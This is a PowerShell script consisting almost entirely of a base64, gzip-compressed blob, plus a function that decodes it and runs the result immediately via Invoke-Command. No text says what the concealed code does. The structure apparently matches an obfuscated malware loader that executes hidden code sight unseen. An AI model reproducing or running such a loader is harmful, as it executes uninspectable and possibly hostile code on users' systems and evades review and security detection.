$EncodedScript = "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"

function Convert-MyScriptScriptBlock {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeLine = $True, HelpMessage = "The Code")]
        [string]$ScriptBlock
    )
    process {
        # Take my B64 string and do a Base64 to Byte array conversion of compressed data
        $ScriptBlockCompressed = [System.Convert]::FromBase64String($ScriptBlock)

        # Then decompress script's data
        $InputStream = New-Object System.IO.MemoryStream (, $ScriptBlockCompressed)
        $GzipStream = New-Object System.IO.Compression.GzipStream $InputStream, ([System.IO.Compression.CompressionMode]::Decompress)
        $StreamReader = New-Object System.IO.StreamReader ($GzipStream)
        $ScriptBlockDecompressed = $StreamReader.ReadToEnd()
        # And close the streams
        $GzipStream.Close()
        $InputStream.Close()

        $ScriptBlockDecompressed
    }
}

$DecodedScript = Convert-MyScriptScriptBlock $EncodedScript

[scriptblock]$sb = [scriptblock]::Create($DecodedScript)
Invoke-Command -ScriptBlock $sb


